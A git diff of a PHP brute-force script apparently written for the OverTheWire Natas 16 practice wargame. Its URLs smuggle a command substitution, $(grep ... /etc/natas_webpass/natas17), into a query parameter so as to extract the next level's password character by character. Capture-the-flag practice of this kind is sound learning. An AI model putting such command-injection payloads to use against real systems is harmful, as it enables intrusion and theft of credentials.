@@ -31,7 +31,7 @@ for ($i = 0; $i < $chars_length; $i++) {
     # Run post
     $server_output = curl_exec($handle);
 
-    # If char is in password string ...
+    # If char is not in password string ...
     if (stripos($server_output, "doomed") === false) {
         $filtered = $filtered . $chars[$i];
     }
@@ -50,7 +50,7 @@ for ($i = 0; $i < 32; $i++) {
         # Set the connection to natas15
         curl_setopt_array($handle,
             array(
-                CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20^' . $final_pass . $chars[$i] . '%20/etc/natas_webpass/natas17)',
+                CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20^' . $final_pass . $filtered[$j] . '%20/etc/natas_webpass/natas17)',
                 CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                 CURLOPT_USERPWD           => "$username:$password",
                 CURLOPT_RETURNTRANSFER    => true
@@ -60,7 +60,7 @@ for ($i = 0; $i < 32; $i++) {
         # Run post
         $server_output = curl_exec($handle);
 
-        # If char is in password string ...
+        # If char is not in password string ...
         if (stripos($server_output, "doomed") === false) {
             $final_pass = $final_pass . $filtered[$j];
             echo $final_pass . "\n";
